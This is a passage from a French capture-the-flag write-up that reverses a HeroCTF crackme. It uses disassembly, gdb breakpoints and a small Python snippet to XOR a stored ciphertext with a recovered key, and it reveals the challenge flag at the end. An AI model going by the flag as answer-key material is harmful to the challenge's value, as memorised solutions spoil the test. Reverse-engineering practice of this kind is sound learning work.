   0x00000000000015f3 <+249>:	mov    -0x18(%rbp),%rax
   0x00000000000015f7 <+253>:	add    %rdx,%rax
   0x00000000000015fa <+256>:	movzbl (%rax),%ecx
   0x00000000000015fd <+259>:	mov    -0x24(%rbp),%eax
   0x0000000000001600 <+262>:	cltq   
   0x0000000000001602 <+264>:	mov    $0x0,%edx
   0x0000000000001607 <+269>:	divq   -0x8(%rbp)
   0x000000000000160b <+273>:	mov    -0x10(%rbp),%rax
   0x000000000000160f <+277>:	add    %rdx,%rax
   0x0000000000001612 <+280>:	movzbl (%rax),%eax
   0x0000000000001615 <+283>:	xor    %eax,%ecx
   0x0000000000001617 <+285>:	mov    %ecx,%edx
   0x0000000000001619 <+287>:	mov    0x29f8(%rip),%rcx        # 0x4018 <STRANGE>
   0x0000000000001620 <+294>:	mov    -0x24(%rbp),%eax
   0x0000000000001623 <+297>:	cltq   
   0x0000000000001625 <+299>:	add    %rcx,%rax
   0x0000000000001628 <+302>:	movzbl (%rax),%eax
   0x000000000000162b <+305>:	cmp    %al,%dl
   0x000000000000162d <+307>:	je     0x1639 <main+319>
   0x000000000000162f <+309>:	mov    $0x0,%eax
   0x0000000000001634 <+314>:	call   0x14bb <fail>
   0x0000000000001639 <+319>:	addl   $0x1,-0x24(%rbp)
   0x000000000000163d <+323>:	cmpl   $0x1e,-0x24(%rbp)
   0x0000000000001641 <+327>:	jle    0x15ed <main+243>
   0x0000000000001643 <+329>:	mov    -0x18(%rbp),%rax
   0x0000000000001647 <+333>:	mov    %rax,%rsi
   0x000000000000164a <+336>:	lea    0xb3f(%rip),%rax        # 0x2190
   0x0000000000001651 <+343>:	mov    %rax,%rdi
   0x0000000000001654 <+346>:	mov    $0x0,%eax
   0x0000000000001659 <+351>:	call   0x10f0 <printf@plt>
   0x000000000000165e <+356>:	mov    0x29ab(%rip),%rax        # 0x4010 <check_this_out>
   0x0000000000001665 <+363>:	mov    %rax,%rsi
   0x0000000000001668 <+366>:	lea    0xb59(%rip),%rax        # 0x21c8
   0x000000000000166f <+373>:	mov    %rax,%rdi
   0x0000000000001672 <+376>:	mov    $0x0,%eax
   0x0000000000001677 <+381>:	call   0x10f0 <printf@plt>
   0x000000000000167c <+386>:	mov    $0x0,%eax
   0x0000000000001681 <+391>:	leave  
   0x0000000000001682 <+392>:	ret
```

Il y a deux variables commentées de façon bizarre et le reste j’y comprends rien parce que je ne suis pas un sinistre guy d’asm, je vais commencer par poser un breakpoint sur la fonction decode, et run le programme :

![Capture d’écran du 2023-05-15 19-51-40](https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/cd5ddc21-ba74-4de0-9be5-fb3b921d88f5)

Avec moins de 31 caractères on tombe dans le premier fail() du main, et avec 31 caractères on arrive jusqu’au breakpoint situé sur decode(), perfect.

Dans l’appel à decode(), on check ce qu’il y a en mémoire dans le registre rdi, qui contient généralement le premier argument utilisé dans une fonction :

![Capture d’écran du 2023-05-15 19-53-34](https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/06681258-f4fd-425e-89b0-3a8be43a7aef)

Et on tombe bien sur la string inversée par **UNO_REVERSE_CARD()** qui a été entrée en premier paramètre pour la fonction decode(), second check validé.

Et sur la fin on va peut-être afficher les valeurs indiquées **depuis le début avec des commentaires** par le disass main peut-être ?

![Capture d’écran du 2023-05-15 20-01-48](https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/3a32f08e-b23d-4a94-a8ff-e7b0209de91b)

Au vu de la position dans le main de STRANGE, ça semble être un cipher du flag résultant du xor, puisqu’on peut voir qu’il est à l’intérieur de la boucle de comparaison en asm :

```assembly
	 0x00005555555555ed <+243>:	mov    -0x24(%rbp),%eax
   0x00005555555555f0 <+246>:	movslq %eax,%rdx
   0x00005555555555f3 <+249>:	mov    -0x18(%rbp),%rax
   0x00005555555555f7 <+253>:	add    %rdx,%rax
   0x00005555555555fa <+256>:	movzbl (%rax),%ecx
   0x00005555555555fd <+259>:	mov    -0x24(%rbp),%eax
   0x0000555555555600 <+262>:	cltq   
   0x0000555555555602 <+264>:	mov    $0x0,%edx
   0x0000555555555607 <+269>:	divq   -0x8(%rbp)
   0x000055555555560b <+273>:	mov    -0x10(%rbp),%rax
   0x000055555555560f <+277>:	add    %rdx,%rax
   0x0000555555555612 <+280>:	movzbl (%rax),%eax
   0x0000555555555615 <+283>:	xor    %eax,%ecx
   0x0000555555555617 <+285>:	mov    %ecx,%edx
   0x0000555555555619 <+287>:	mov    0x29f8(%rip),%rcx        # 0x555555558018 <STRANGE>
   0x0000555555555620 <+294>:	mov    -0x24(%rbp),%eax
   0x0000555555555623 <+297>:	cltq   
   0x0000555555555625 <+299>:	add    %rcx,%rax
   0x0000555555555628 <+302>:	movzbl (%rax),%eax
   0x000055555555562b <+305>:	cmp    %al,%dl
   0x000055555555562d <+307>:	je     0x555555555639 <main+319>
   0x000055555555562f <+309>:	mov    $0x0,%eax
   0x0000555555555634 <+314>:	call   0x5555555554bb <fail>
   0x0000555555555639 <+319>:	addl   $0x1,-0x24(%rbp)
   0x000055555555563d <+323>:	cmpl   $0x1e,-0x24(%rbp)
   0x0000555555555641 <+327>:	jle    0x5555555555ed <main+243>
```

L’instruction “jle” contrôle la boucle, tandis que l'instruction “je” teste l’égalité après la comparaison. Si les valeurs ne sont pas égales, on tombe dans le call à fail().

Maintenant, tentons de convertir ces bytes en valeur décimale, et tester un [xorcipher](https://github.com/Sleleu/xorcipher) entre ce cipher et la key renvoyée par decode 🙂

```python
flag = bytearray(b'\201c4\001\207T\356\037\342\b9n\220\n\333\f\276f9*\243T\335\025\200f~\020\213F\243')

flag_decimal = [byte for byte in flag]
print(flag_decimal)
```

Le même script que pour le chall crypto, il nous retourne cette liste : **[129, 99, 52, 1, 135, 84, 238, 31, 226, 8, 57, 110, 144, 10, 219, 12, 190, 102, 57, 42, 163, 84, 221, 21, 128, 102, 126, 16, 139, 70, 163]**

On va pouvoir combiner ça avec la key trouvée précédemment : **210 87 77 94 207 103 130 83** 

![Capture d’écran du 2023-05-15 20-18-10](https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/a56ec6ec-2c84-453e-9b43-440bc96f4cb5)

Et voici le flag ! Hero{S4y_H3lL0_t0_mY_l1ttl3_FR13ND!!}
